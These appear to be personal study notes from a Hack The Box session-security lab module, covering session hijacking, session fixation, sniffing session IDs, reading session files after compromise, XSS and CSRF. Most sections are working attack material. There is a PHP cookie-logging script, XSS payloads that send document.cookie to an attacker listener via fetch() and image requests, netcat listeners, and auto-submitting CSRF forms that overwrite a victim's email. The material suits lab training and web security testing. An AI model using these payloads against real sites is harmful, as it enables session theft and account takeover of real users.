# Session Security

## Session Identifier storage locations

- **URL** 
- **HTML**
- **sessionStorage**
- **localStorage**

**TIP** Adding vhosts to hosts file

```bash
IP=ENTER SPAWNED TARGET IP HERE
printf "%s\t%s\n\n" "$IP" "xss.htb.net csrf.htb.net oredirect.htb.net minilab.htb.net" | sudo tee -a /etc/hosts
```

## Session Hijacking

An attacker can obtain a victim's session identifier using several methods, with the most common being:

- Passive Traffic Sniffing
- Cross-Site Scripting (XSS)
- Browser history or log-diving
- Read access to a database containing session information

Replace your identifier with the victims to access their session.

## Session Fixation

Trick the victim into logging in with a previously obtained valid session identifier.
Works when session identifier: 
- is the same pre and post login.
- is accepted URL query string or post data.

### Example

If we visit ```http://insecure.exampleapp.com/login?PHPSESSID=AttackerSpecifiedCookieValue``` and find that ```AttackerSpecifiedCookieValue``` has been propagated to the cookie value there is a vulnerability.

## Obtaining Session Identifiers without User Interaction

### Obtaining Session Identifiers via Traffic Sniffing

#### Wireshark 

- Navigate to Edit -> Find Packet
- Left-click on Packet list and then click Packet bytes
- Select String on the third drop-down menu and specify auth-session on the field next to it
- Click Find
- Click Copy then Value
- Replace cookie value with the stolen one and refresh page

### Obtaining Session Identifiers Post-Exploitation (Web Server Access)

#### PHP

Find session storage location:
```bash
locate php.ini
cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'
cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'
```
Then look for authenticated users session data:
```bash
ls /var/lib/php/sessions
cat //var/lib/php/sessions/sess_s6kitq8d3071rmlvbfitpim9mm
```
For a hacker to hijack the user session related to the session identifier above, a new cookie must be created in the web browser with the following values:
- cookie name: PHPSESSID
- cookie value: s6kitq8d3071rmlvbfitpim9mm

### Obtaining Session Identifiers Post-Exploitation (Database Access)

```sql
show databases;
use project;
show tables;
select * from users; -- look in tables found previously
select * from all_sessions;
select * from all_sessions where id=3; -- look in specific record in a table
```

## Cross-Site Scripting (XSS)

For a Cross-Site Scripting (XSS) attack to result in session cookie leakage, the following requirements must be fulfilled:
- Session cookies should be carried in all HTTP requests
- Session cookies should be accessible by JavaScript code (the HTTPOnly attribute should be missing (check in cookies web dev tools))

Test fields with the following payloads
```js
"><img src=x onerror=prompt(document.domain)>
"><img src=x onerror=confirm(1)>
"><img src=x onerror=alert(1)>
```
dependning on what (if anything) is returned will tell you which field is vulnerable

### Obtaining session cookies through XSS

- Create a cookie-logging script
```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>
```
- start the listener
```bash
php -S <VPN/TUN Adapter IP>:8000
```
- update the vulnerable field with a payload
```js
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
// or
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
```
- visit the updated profile page to trigger the payload

**Note:** If you're doing testing in the real world, try using something like [XSSHunter (now deprecated)](https://xsshunter.com/#/), [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [Project Interactsh](https://app.interactsh.com/#/). A default PHP Server or Netcat may not send data in the correct form when the target web application utilizes HTTPS.

### Obtaining session cookies via XSS (Netcat edition)

- example payload
```js
<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
// or 
<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
```
- listener
```bash
nc -nlvp 8000
```
- cookie will arrive b64 encoded because the btoa() function was used.

## Cross-Site Request Forgery (CSRF or XSRF)

A web application is vulnerable to CSRF attacks when:
- All the parameters required for the targeted request can be determined or guessed by the attacker
- The application's session management is solely based on HTTP cookies, which are automatically included in browser requests

To successfully exploit a CSRF vulnerability, we need:
- To craft a malicious web page that will issue a valid (cross-site) request impersonating the victim
- The victim to be logged into the application at the time when the malicious cross-site request is issued

### Example

- Make a change (update profile etc)
- Intercept request
- Check for presence of anti-CSRF token
- Create a HTML file based on the form being filled out ([reference](https://developer.mozilla.org/en-US/docs/Learn_web_development/Extensions/Forms/Sending_and_retrieving_form_data)):
```html
<html>
  <body>
    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```
- serve the form
```bash
python -m http.server 1337
```
- Visit the served page in a new tab ```http://<VPN/TUN Adapter IP>:1337/notmalicious.html```
- Check original page to see if details have updated

### Cross-Site Request Forgery (GET-based)

- inspect get request with burp etc ```GET /app/save/julie.rogers@example.com?telephone=%28834%29-609-2003&country=United+States&csrf=d33c0908672c32d7a3a6bc1700ee65983b57c688&email=julie.rogers%40example.com&action=save HTTP/1.1```
-  create and serve corresponding HTML page:
```html
<!-- save as notmalicious_get.html -->
<html>
  <body>
    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```
```bash
python -m http.server 1337
```
- whilst user is still logged in visit ```http://<VPN/TUN Adapter IP>:1337/notmalicious_get.html```
- refresh profile page to see if updates have taken effect

### Cross-Site Request Forgery (POST-based)

- can abuse reflected URL values
- set up netcat listener
```bash
nc -nlvp 8000
```
- visit ```http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f<VPN/TUN Adapter IP>:8000%2f``` where ```%3Ctable background='%2f%2f<VPN/TUN Adapter IP>:8000%2f``` is the reflected part
- listener should record the csrf token which can be used for post requests


